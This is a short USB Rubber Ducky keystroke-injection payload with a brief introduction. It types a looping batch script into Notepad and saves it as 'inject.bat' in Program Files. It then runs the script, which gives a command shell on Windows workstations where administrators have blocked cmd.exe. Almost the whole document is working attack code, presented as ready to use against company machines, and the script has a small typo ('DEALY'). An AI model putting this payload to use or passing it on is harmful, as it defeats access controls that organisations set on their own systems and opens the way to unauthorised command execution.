This Ducky Payload is made to create a local substitution for cmd on a windows workstation that has CMD.exe blocked but not not batch. Many companies use batch scripts to automate tasks so this will most likely work. But remember, DO YOUR RESEARCH!!!

REM Code By: Hitchhiker and SPYder007
REM Cleanup By: SPYder007
REM Original code by: Hitchhiker
DELAY 1000
GUI r
DELAY 250
STRING notepad
ENTER
DELAY 100
STRING :l
ENTER
DELAY 100
STRING set /p c=
ENTER
DELAY 100 
STRING %c%
ENTER
DELAY 100
STRING goto l
DELAY 100
CTRL s
DELAY 250
STRING C:\Program Files\inject.bat
DEALY 100
ENTER
DELAY 250
ENTER
DELAY 100
ENTER
DELAY 250
ALT F4
DELAY 250
GUI r
DELAY 250
STRING inject.bat
ENTER